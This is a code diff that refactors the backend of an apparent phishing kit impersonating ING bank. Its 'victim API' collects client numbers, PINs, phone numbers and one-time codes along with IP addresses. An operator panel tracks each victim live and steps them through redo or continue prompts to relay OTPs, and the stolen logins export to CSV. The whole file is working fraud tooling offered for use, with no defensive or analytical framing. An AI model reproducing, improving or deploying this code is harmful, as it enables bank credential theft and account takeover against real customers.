@@ -2,47 +2,17 @@
 const express = require('express');
 const cors    = require('cors');
 const crypto  = require('crypto');
-const session = require('cookie-session');
 
 /* ----------  CONFIG  ---------- */
 const PANEL_USER     = process.env.PANEL_USER  || 'admin';
 const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
-const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
+const COOKIE_SECRET  = process.env.COOKIE_SECRET || crypto.randomBytes(32).toString('hex');
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-console.log('ENV check:', { PANEL_USER, PANEL_PASS: PANEL_PASS ? '***' : 'not set' });
-
-/* ----------  SIMPLE EVENT BUS  ---------- */
-const events = new (require('events')).EventEmitter();
-function emitPanelUpdate() { events.emit('panel'); }
-
-// Trust proxy – required behind Railway / Render / Cloudflare
-app.set('trust proxy', ['loopback', 'linklocal', 'uniquelocal']);
-
-// Security headers middleware
-app.use((req, res, next) => {
-  res.setHeader('X-Frame-Options', 'DENY');
-  res.setHeader('X-Content-Type-Options', 'nosniff');
-  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
-  next();
-});
-
-app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-// Session middleware – FIXED for Cloudflare proxy
-app.use(session({
-  name: 'pan_sess',
-  keys: [SESSION_SECRET],
-  maxAge: 24 * 60 * 60 * 1000,
-  sameSite: 'none',        // REQUIRED for Cloudflare proxy
-  secure: true,            // REQUIRED for HTTPS through Cloudflare
-  httpOnly: true,
-  domain: undefined        // Let browser handle domain
-}));
+console.log('Starting server...');
+console.log('Panel user:', PANEL_USER);
 
 /* ----------  STATE  ---------- */
 const sessionsMap     = new Map();
@@ -51,6 +21,35 @@ const auditLog        = [];
 let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';
+
+// Simple in-memory auth store (sid -> authed)
+const authSessions = new Map();
+
+/* ----------  MIDDLEWARE  ---------- */
+app.set('trust proxy', 1);
+
+app.use(cors());
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// Simple cookie parser for auth
+app.use((req, res, next) => {
+  const cookie = req.headers.cookie || '';
+  req.authToken = cookie.split(';').find(c => c.trim().startsWith('auth='))?.split('=')[1] || null;
+  next();
+});
+
+/* ----------  AUTH MIDDLEWARE  ---------- */
+function checkAuth(req, res, next) {
+  const token = req.authToken;
+  if (token && authSessions.has(token)) {
+    req.isAuthed = true;
+    req.username = authSessions.get(token);
+    return next();
+  }
+  req.isAuthed = false;
+  next();
+}
 
 /* ----------  STATIC ROUTES  ---------- */
 app.use(express.static(__dirname));
@@ -61,29 +60,36 @@ app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.
 app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
 app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
 
-/* ----------  PANEL ACCESS CONTROL  ---------- */
-app.get('/panel', (req, res) => {
-  if (req.session?.authed === true) return res.sendFile(__dirname + '/_panel.html');
+/* ----------  PANEL ROUTES  ---------- */
+app.get('/panel', checkAuth, (req, res) => {
+  if (req.isAuthed) return res.sendFile(__dirname + '/_panel.html');
   res.sendFile(__dirname + '/access.html');
 });
 
 app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
-  console.log('Login attempt:', { user, expected: PANEL_USER, match: user === PANEL_USER, pwMatch: pw === PANEL_PASS });
+  console.log('Login attempt:', user, 'Expected:', PANEL_USER, 'Match:', user === PANEL_USER && pw === PANEL_PASS);
   
   if (user === PANEL_USER && pw === PANEL_PASS) {
-    req.session.authed   = true;
-    req.session.username = user;
-    console.log('Login successful, session:', req.session);
-    return res.redirect(302, '/panel');
+    const token = crypto.randomBytes(16).toString('hex');
+    authSessions.set(token, user);
+    
+    // Set cookie with minimal restrictions for Cloudflare compatibility
+    res.setHeader('Set-Cookie', `auth=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
+    console.log('Login success, token:', token);
+    return res.redirect('/panel');
   }
-  console.log('Login failed');
-  res.redirect(302, '/panel?fail=1');
+  
+  res.redirect('/panel?fail=1');
 });
 
-app.get('/panel/*', (req, res) => res.redirect(302, '/panel'));
-app.post('/panel/logout', (req, res) => { req.session = null; res.redirect('/panel'); });
-app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
+app.post('/panel/logout', (req, res) => {
+  if (req.authToken) authSessions.delete(req.authToken);
+  res.setHeader('Set-Cookie', 'auth=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
+  res.redirect('/panel');
+});
+
+app.get('/panel/*', (req, res) => res.redirect('/panel'));
 
 /* ----------  DOMAIN HELPER  ---------- */
 app.use((req, res, next) => {
@@ -107,58 +113,38 @@ function uaParser(ua) {
   return u;
 }
 
-/* ----------  SESSION HEADER HELPER  ---------- */
+/* ----------  SESSION HELPERS  ---------- */
 function getSessionHeader(v) {
   if (v.page === 'success') return `🦁 ING Login approved`;
   if (v.status === 'approved') return `🦁 ING Login approved`;
-  if (v.page === 'index.html') {
-    return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
-  } else if (v.page === 'verify.html') {
-    return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
-  } else if (v.page === 'unregister.html') {
-    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
-  } else if (v.page === 'otp.html') {
-    if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
-    return `🔑 Awaiting OTP...`;
-  }
+  if (v.page === 'index.html') return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
+  if (v.page === 'verify.html') return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
+  if (v.page === 'unregister.html') return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
+  if (v.page === 'otp.html') return v.otp ? `✅ Received OTP` : `🔑 Awaiting OTP...`;
   return `🔑 Awaiting OTP...`;
 }
 
-function cleanupSession(sid, reason, silent = false) {
-  const v = sessionsMap.get(sid);
-  if (!v) return;
-  sessionsMap.delete(sid);
-  sessionActivity.delete(sid);
-}
-
 /* ----------  VICTIM API  ---------- */
-app.post('/api/session', async (req, res) => {
-  try {
-    const sid = crypto.randomUUID();
-    const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-    const ua  = req.headers['user-agent'] || 'n/a';
-    const now = new Date();
-    const dateStr = now.toLocaleString();
-
-    victimCounter++;
-    const victim = {
-      sid, ip, ua, dateStr,
-      entered: false, email: '', password: '', phone: '', otp: '', billing: '',
-      page: 'index.html',
-      platform: uaParser(ua).os?.name || 'n/a',
-      browser: uaParser(ua).browser?.name || 'n/a',
-      attempt: 0, totalAttempts: 0, otpAttempt: 0, unregisterClicked: false,
-      status: 'loaded', victimNum: victimCounter,
-      interactions: [],
-      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to page' }]
-    };
-    sessionsMap.set(sid, victim);
-    sessionActivity.set(sid, Date.now());
-    res.json({ sid });
-  } catch (err) {
-    console.error('Session creation error', err);
-    res.status(500).json({ error: 'Failed to create session' });
-  }
+app.post('/api/session', (req, res) => {
+  const sid = crypto.randomUUID();
+  const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  const ua  = req.headers['user-agent'] || 'n/a';
+  
+  victimCounter++;
+  const victim = {
+    sid, ip, ua, dateStr: new Date().toLocaleString(),
+    entered: false, email: '', password: '', phone: '', otp: '',
+    page: 'index.html',
+    platform: uaParser(ua).os?.name || 'n/a',
+    browser: uaParser(ua).browser?.name || 'n/a',
+    unregisterClicked: false,
+    status: 'loaded', victimNum: victimCounter,
+    activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected' }]
+  };
+  
+  sessionsMap.set(sid, victim);
+  sessionActivity.set(sid, Date.now());
+  res.json({ sid });
 });
 
 app.post('/api/ping', (req, res) => {
@@ -170,177 +156,106 @@ app.post('/api/ping', (req, res) => {
   res.sendStatus(404);
 });
 
-app.post('/api/login', async (req, res) => {
-  try {
-    const { sid, email, password } = req.body;
-    if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
-    if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    const v = sessionsMap.get(sid);
-    v.entered = true; v.email = email; v.password = password;
-    v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
-    sessionActivity.set(sid, Date.now());
-
-    v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
-
-    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
-    res.sendStatus(200);
-  } catch (err) {
-    console.error('Login error', err);
-    res.status(500).send('Error');
-  }
+app.post('/api/login', (req, res) => {
+  const { sid, email, password } = req.body;
+  if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
+  
+  const v = sessionsMap.get(sid);
+  if (!v) return res.sendStatus(404);
+  
+  v.entered = true; 
+  v.email = email; 
+  v.password = password;
+  v.status = 'wait';
+  v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
+  
+  auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, ip: v.ip, ua: v.ua });
+  res.sendStatus(200);
 });
 
-app.post('/api/verify', async (req, res) => {
-  try {
-    const { sid, phone } = req.body;
-    if (!phone?.trim()) return res.sendStatus(400);
-    if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    const v = sessionsMap.get(sid);
-    v.phone = phone; v.status = 'wait';
-    sessionActivity.set(sid, Date.now());
-
-    v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });
-
-    const entry = auditLog.find(e => e.sid === sid);
-    if (entry) entry.phone = phone;
-    res.sendStatus(200);
-  } catch (e) {
-    console.error('Verify error', e);
-    res.sendStatus(500);
-  }
+app.post('/api/verify', (req, res) => {
+  const { sid, phone } = req.body;
+  if (!phone?.trim()) return res.sendStatus(400);
+  
+  const v = sessionsMap.get(sid);
+  if (!v) return res.sendStatus(404);
+  
+  v.phone = phone;
+  v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });
+  
+  const entry = auditLog.find(e => e.sid === sid);
+  if (entry) entry.phone = phone;
+  res.sendStatus(200);
 });
 
-app.post('/api/unregister', async (req, res) => {
-  try {
-    const { sid } = req.body;
-    if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    const v = sessionsMap.get(sid);
-    v.unregisterClicked = true; v.status = 'wait';
-    sessionActivity.set(sid, Date.now());
-
-    v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });
-
-    res.sendStatus(200);
-  } catch (err) {
-    console.error('Unregister error', err);
-    res.sendStatus(500);
-  }
+app.post('/api/unregister', (req, res) => {
+  const { sid } = req.body;
+  const v = sessionsMap.get(sid);
+  if (!v) return res.sendStatus(404);
+  
+  v.unregisterClicked = true;
+  v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Proceeded to unregister' });
+  res.sendStatus(200);
 });
 
-app.post('/api/otp', async (req, res) => {
-  try {
-    const { sid, otp } = req.body;
-    if (!otp?.trim()) return res.sendStatus(400);
-    if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    const v = sessionsMap.get(sid);
-    v.otp = otp; v.status = 'wait';
-    sessionActivity.set(sid, Date.now());
-
-    v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
-
-    const entry = auditLog.find(e => e.sid === sid);
-    if (entry) entry.otp = otp;
-    res.sendStatus(200);
-  } catch (err) {
-    console.error('OTP error', err);
-    res.status(500).send('Error');
-  }
+app.post('/api/otp', (req, res) => {
+  const { sid, otp } = req.body;
+  if (!otp?.trim()) return res.sendStatus(400);
+  
+  const v = sessionsMap.get(sid);
+  if (!v) return res.sendStatus(404);
+  
+  v.otp = otp;
+  v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
+  
+  const entry = auditLog.find(e => e.sid === sid);
+  if (entry) entry.otp = otp;
+  res.sendStatus(200);
 });
 
-app.post('/api/page', async (req, res) => {
-  try {
-    const { sid, page } = req.body;
-    if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    const v = sessionsMap.get(sid);
-    const oldPage = v.page;
-    v.page = page;
-    sessionActivity.set(sid, Date.now());
-
-    v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
-
-    res.sendStatus(200);
-  } catch (err) {
-    console.error('Page change error', err);
-    res.status(500).send('Error');
-  }
+app.post('/api/page', (req, res) => {
+  const { sid, page } = req.body;
+  const v = sessionsMap.get(sid);
+  if (!v) return res.sendStatus(404);
+  
+  const oldPage = v.page;
+  v.page = page;
+  v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
+  res.sendStatus(200);
 });
 
 app.get('/api/status/:sid', (req, res) => {
   const v = sessionsMap.get(req.params.sid);
-  if (!v) return res.json({ status: 'gone' });
-  res.json({ status: v.status });
-});
-
-app.post('/api/clearRedo', (req, res) => {
-  const v = sessionsMap.get(req.body.sid);
-  if (v && v.status === 'redo') v.status = 'loaded';
-  res.sendStatus(200);
-});
-
-app.post('/api/clearOk', (req, res) => {
-  const v = sessionsMap.get(req.body.sid);
-  if (v && v.status === 'ok') v.status = 'loaded';
-  res.sendStatus(200);
-});
-
-app.post('/api/interaction', (req, res) => {
-  const { sid, type, data } = req.body;
-  if (!sessionsMap.has(sid)) return res.sendStatus(404);
-  const v = sessionsMap.get(sid);
-  v.lastInteraction = Date.now();
-  v.interactions = v.interactions || [];
-  v.interactions.push({ type, data, time: Date.now() });
-  sessionActivity.set(sid, Date.now());
-  res.sendStatus(200);
+  res.json({ status: v ? v.status : 'gone' });
 });
 
 /* ----------  PANEL API  ---------- */
-app.get('/api/user', (req, res) => {
-  if (req.session?.authed) return res.json({ username: req.session.username || PANEL_USER });
-  res.status(401).json({ error: 'Not authenticated' });
-});
-
-// helper that builds the payload
-function buildPanelPayload() {
+app.get('/api/panel', checkAuth, (req, res) => {
+  if (!req.isAuthed) return res.status(401).json({ error: 'Not authenticated' });
+  
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
     ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
     entered: v.entered, unregisterClicked: v.unregisterClicked,
-    activityLog: v.activityLog || []
+    activityLog: v.activityLog
   }));
-  return {
+  
+  res.json({
     domain: currentDomain,
-    username: PANEL_USER,
+    username: req.username || PANEL_USER,
     totalVictims: victimCounter,
     active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
     success: successfulLogins,
     sessions: list,
     logs: auditLog.slice(-50).reverse()
-  };
-}
-
-app.get('/api/panel', (req, res) => {
-  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
-
-  // long-poll: wait up to 1 s for an event
-  const listener = () => res.json(buildPanelPayload());
-  events.once('panel', listener);
-  setTimeout(() => {
-    events.removeListener('panel', listener);
-    res.json(buildPanelPayload());
-  }, 1000);
+  });
 });
 
-app.post('/api/panel', async (req, res) => {
-  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
-
+app.post('/api/panel', checkAuth, (req, res) => {
+  if (!req.isAuthed) return res.status(401).json({ error: 'Not authenticated' });
+  
   const { action, sid } = req.body;
   const v = sessionsMap.get(sid);
   if (!v) return res.status(404).json({ ok: false });
@@ -348,11 +263,11 @@ app.post('/api/panel', async (req, res) => {
   switch (action) {
     case 'redo':
       if (v.page === 'index.html') {
-        v.status = 'redo'; v.entered = false; v.email = ''; v.password = ''; v.otp = '';
+        v.status = 'redo'; v.entered = false; v.email = ''; v.password = '';
       } else if (v.page === 'verify.html') {
         v.status = 'redo'; v.phone = '';
       } else if (v.page === 'otp.html') {
-        v.status = 'redo'; v.otp = ''; v.otpAttempt++;
+        v.status = 'redo'; v.otp = '';
       }
       break;
     case 'cont':
@@ -363,43 +278,32 @@ app.post('/api/panel', async (req, res) => {
       else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
       break;
     case 'delete':
-      cleanupSession(sid, 'deleted from panel');
-      emitPanelUpdate();
+      sessionsMap.delete(sid);
+      sessionActivity.delete(sid);
       break;
   }
   res.json({ ok: true });
 });
 
-/* ----------  CSV EXPORT  ---------- */
-app.get('/api/export', (req, res) => {
-  if (!req.session?.authed) return res.status(401).send('Unauthorized');
-
+app.get('/api/export', checkAuth, (req, res) => {
+  if (!req.isAuthed) return res.status(401).send('Unauthorized');
+  
   const successes = auditLog
     .filter(r => r.phone && r.otp)
-    .map(r => ({
-      victimNum: r.victimN,
-      email: r.email,
-      password: r.password,
-      phone: r.phone,
-      otp: r.otp,
-      ip: r.ip,
-      ua: r.ua,
-      timestamp: new Date(r.t).toISOString()
-    }));
-
+    .map(r => [r.victimN, r.email, r.password, r.phone, r.otp, r.ip, r.ua, new Date(r.t).toISOString()]);
+  
   const csv = [
     ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
-    ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
-  ].map(r=>r.join(',')).join('\n');
-
+    ...successes
+  ].map(r => r.map(v => `"${v}"`).join(',')).join('\n');
+  
   res.setHeader('Content-Type', 'text/csv');
-  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
+  res.setHeader('Content-Disposition', 'attachment; filename="logins.csv"');
   res.send(csv);
 });
 
 /* ----------  START  ---------- */
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
-  console.log(`Panel user: ${PANEL_USER}`);
-  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
+  currentDomain = process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`;
 });
